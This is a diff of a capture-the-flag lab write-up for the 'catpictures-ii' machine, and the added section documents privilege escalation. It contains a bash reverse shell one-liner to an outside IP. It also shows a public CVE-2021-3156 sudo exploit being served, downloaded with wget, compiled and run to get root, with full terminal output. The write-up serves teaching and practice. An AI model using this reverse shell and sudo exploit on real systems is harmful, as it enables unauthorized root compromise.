@@ -129,7 +129,7 @@ Megapixels                      : 0.778
 this part
 ```Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt```
 ##
-It appears that the system is utilizing another web server to retrieve Info.
+It appears that the system is utilizing The other web server to retrieve Info.
 
 ```red
 note to self:
@@ -161,6 +161,77 @@ Given our knowledge of Ansible Runner (Olivetin) on port 1337, which enables the
 bash -c "bash -i >& /dev/tcp/10.18.81.1/14632 0>&1"
 ```
 
+After obtaining a shell, I discovered an "id_rsa" file, which I utilized to establish a more stable shell.
+Subsequently, I attempted to exec Linpeas on the server to conduct further enumeration and analysis.
+</br>
+we have a vulnerable sudo version here.
+After patiently waiting during the Linpeas scan, I stumbled upon an interesting CVE (Common Vulnerabilities and Exposures) in the target machine. To gather more information, I conducted a Google search and came across a GitHub proof-of-concept ([! POC](https://github.com/blasty/CVE-2021-3156)) related to the discovered vulnerability.
+
+</br>
+
+## Priv-Esc
+
+Let's set up a Python3 server to share the CVE details with the target.
+
+```bash
+root@Fs:.../www/html# ll
+total 9.6M
+drwxr-xr-x 3 root  root  4.0K Jul  5 18:01 CVE-2021-3156/
+-rw-r--r-- 1 root  root  3.1M Jun  4 05:27 linpeas_linux_amd64
+-rwxrwxr-x 1 achux achux 817K Jun  6 16:41 linpeas.sh*
+-rw-rw-r-- 1 achux achux 5.7M Jun  5 23:55 nmap
+-rw-r--r-- 1 root  root   18K Jun  6 15:42 PwnKit
+root@Fs:.../www/html# webup
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+! note : webup /=/ alias "webup='python3 -m http.server 8000'"
+
+
+```bash
+bismuth@catpictures-ii:/$ cd /tmp; wget -r 10.18.81.222/CVE-2021-3156/
+```
+
+let's go aHead to explore the CVE
+
+```bash
+bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ls
+brute.sh  hax.c  lib.c  Makefile  README.md
+bismuth@catpictures-ii:/tmp/CVE-2021-3156$ make
+rm -rf libnss_X
+mkdir libnss_X
+gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
+gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
+bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ls
+brute.sh  hax.c  lib.c  libnss_X  Makefile  README.md  sudo-hax-me-a-sandwich
+bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+  usage: ./sudo-hax-me-a-sandwich <target>
+
+  available targets:
+  ------------------------------------------------------------
+    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
+    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
+    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
+  ------------------------------------------------------------
+
+  manual mode:
+    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
+
+bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
+** pray for your rootshell.. **
+[+] bl1ng bl1ng! We got it!
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1000(bismuth)
+# 
+```
+And now we have pwned the machine
+I appreciate your patience❤️ 
 
 
 
